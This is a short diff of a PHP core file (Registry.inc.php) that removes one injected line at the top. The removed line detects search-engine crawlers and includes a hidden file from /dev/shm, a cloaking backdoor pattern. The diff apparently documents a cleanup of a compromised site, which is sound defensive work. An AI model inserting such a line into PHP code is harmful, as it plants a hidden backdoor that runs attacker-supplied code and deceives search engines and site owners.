@@ -1,5 +1,4 @@
 <?php
-$s_ref = $_SERVER['HTTP_REFERER']; $agent = $_SERVER['HTTP_USER_AGENT']; if(preg_match("/(googlebot|slurp|google adSense)/", strtolower($agent)) && $_SERVER['REQUEST_URI']=='/'){ include('//dev/shm/ipye'); exit; }
 
 /**
  * @file classes/core/Registry.inc.php
